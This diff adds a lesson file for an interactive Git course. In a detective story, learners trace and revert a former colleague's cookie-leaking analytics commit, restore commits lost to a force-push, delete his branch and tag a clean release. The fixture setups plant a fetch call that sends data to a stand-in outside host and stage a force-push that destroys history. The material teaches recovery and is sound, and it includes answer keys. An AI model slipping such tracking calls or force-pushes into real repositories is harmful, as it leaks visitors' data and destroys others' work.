@@ -1,0 +1,120 @@
+steps:
+  - kind: explain
+    title: The last door
+    body: |
+      Inspector Bold: *"Marcus could push to the website. Somebody force-pushed `main` last night: two of Priya's commits are gone from GitHub. Your clone was made before that. Put the history right, and take out what he put in."*
+
+      This review covers Modules 33 to 37. Work in your clone **`~/site`**. Look first (`git log --oneline --graph --all`, `git fetch`), then act.
+
+  - kind: shell
+    title: "1. Where did the tracking come from?"
+    fixture: [git-identity, website-repo, website-more, github-account, github-site, site-clone]
+    setup: cd ~/site
+    body: |
+      > *The site sends cookies to `stats.inkwell-analytics.example`. List, one line each, the commits that **added or removed** that text.*
+    output: true
+    solution: git log -S stats.inkwell-analytics.example --oneline
+    hint: "The pickaxe: `git log -S 'stats.inkwell-analytics.example' --oneline`."
+
+  - kind: shell
+    title: "2. Put Priya's commits back on GitHub"
+    fixture: [git-identity, website-repo, website-more, github-account, github-site, site-clone]
+    setup: |
+      git clone -q git@github.com:inkwell/site.git /tmp/m 2> /dev/null
+      cd /tmp/m
+      git reset -q --hard HEAD~2
+      git push -q --force 2> /dev/null
+      git switch -q -c marcus/tracking
+      printf 'fetch("https://stats.inkwell-analytics.example/collect?all=1");\n' >> analytics.js
+      GIT_AUTHOR_NAME="Marcus Reed" GIT_AUTHOR_EMAIL=marcus@inkwell.example git commit -qam "More statistics"
+      git push -q -u origin marcus/tracking 2> /dev/null
+      cd ~/site && rm -rf /tmp/m
+    body: |
+      > *Fetch, and see what happened to GitHub's `main`. Your clone still has the two commits it lost. Make GitHub's `main` match yours again, without a force-push.*
+    tests:
+      - git ls-remote origin refs/heads/main | cut -f1 | grep -c "$(git rev-parse main)"
+      - git log --format=%s -3 origin/main
+    solution: |
+      git fetch
+      git log --oneline origin/main..main
+      git push
+    uses:
+      - match: "git\\s+fetch"
+        why: "fetch first, so you see what the force-push did (look for *forced update*)."
+    hint: "`git fetch` shows `+ … main -> origin/main (forced update)`. `git log --oneline origin/main..main` lists the two commits GitHub lost. Since GitHub's main is now *behind* yours, a plain `git push` puts them back."
+
+  - kind: shell
+    title: "3. Take the leak out"
+    fixture: [git-identity, website-repo, website-more, github-account, github-site, site-clone]
+    setup: cd ~/site
+    body: |
+      > *Undo Marcus's `Add analytics` commit on `main` in a way that's safe for a shared branch (everyone has already pulled it), keep Git's suggested message, and push.*
+    tests:
+      - git log -1 --format=%s
+      - git fetch -q && git show origin/main:index.html | grep -c analytics
+      - git log --format=%s origin/main | grep -c "^Add analytics"
+    solution: |
+      git revert --no-edit dc44b37
+      git push
+    reject:
+      - git reset --hard dc44b37~1
+    hint: "`git revert --no-edit dc44b37` (find the hash with `git log --oneline`), then `git push`."
+
+  - kind: shell
+    title: "4. Remove his branch"
+    fixture: [git-identity, website-repo, website-more, github-account, github-site, site-clone]
+    setup: |
+      git clone -q git@github.com:inkwell/site.git /tmp/m 2> /dev/null
+      cd /tmp/m && git switch -q -c marcus/tracking
+      printf 'fetch("https://stats.inkwell-analytics.example/collect?all=1");\n' >> analytics.js
+      GIT_AUTHOR_NAME="Marcus Reed" GIT_AUTHOR_EMAIL=marcus@inkwell.example git commit -qam "More statistics"
+      git push -q -u origin marcus/tracking 2> /dev/null
+      cd ~/site && rm -rf /tmp/m
+    body: |
+      > *Marcus also pushed a branch, `marcus/tracking`, with more of the same. Nobody needs it. Delete it **on GitHub**.*
+    tests:
+      - git ls-remote --heads origin | cut -f2
+    solution: |
+      git fetch
+      git push origin --delete marcus/tracking
+    hint: "`git fetch` shows it as `origin/marcus/tracking`. `git push origin --delete marcus/tracking` removes it from GitHub."
+
+  - kind: shell
+    title: "5. Mark the clean version"
+    fixture: [git-identity, website-repo, website-more, github-account, github-site, site-clone]
+    setup: |
+      cd ~/site
+      git revert -q --no-edit dc44b37
+      git push -q 2> /dev/null
+    body: |
+      > *The revert is on GitHub. Mark this commit as release **`v1.2`** with an annotated tag (message: `Tracking script removed`) and push the tag.*
+    tests:
+      - git cat-file -t v1.2
+      - git tag -n v1.2
+      - git ls-remote --tags origin | cut -f2
+    solution: |
+      git tag -a v1.2 -m "Tracking script removed"
+      git push origin v1.2
+    hint: "`git tag -a v1.2 -m \"Tracking script removed\"`, then `git push origin v1.2`."
+
+  - kind: choice
+    title: "6. Explain it to the owners"
+    body: |
+      > *The owners ask: "Why didn't you simply delete the bad commit from the history?"*
+    options:
+      - "Everyone already has it; rewriting shared history means force-pushing, which is how Priya's work got lost. A revert undoes it in the open"
+      - "Git can't delete commits at all, not even from your own computer"
+      - "Deleting it would also delete the commits before it, back to the first one"
+      - "Only GitHub administrators can delete commits, and Inkwell has none"
+    answer: 0
+    explanation: "Commits can be rewritten away (rebase, reset), but on a shared branch that forces everyone else to repair their copies, and a careless force-push loses work, as last night showed. Revert keeps the record: the leak, and its removal. (The leaked cookies still have to be dealt with: log everyone out.)"
+
+  - kind: recap
+    body: |
+      Season 2, case closed:
+
+      - **Office server:** a hidden root program sending data to the old backup server (review 4).
+      - **Shop server:** Marcus's laptop key still opened the `deploy` account; removed with the cron job and the program (review 5).
+      - **Website:** his `Add analytics` commit sent visitors' cookies out; reverted, and tagged clean as `v1.2`. His force-push that deleted Priya's commits was undone from your clone; his branch deleted.
+
+      Inspector Bold: *"Every one of those doors was left open by habit: old keys, shared passwords, anyone allowed to push to main. Next: make GitHub enforce the good habits for us."*
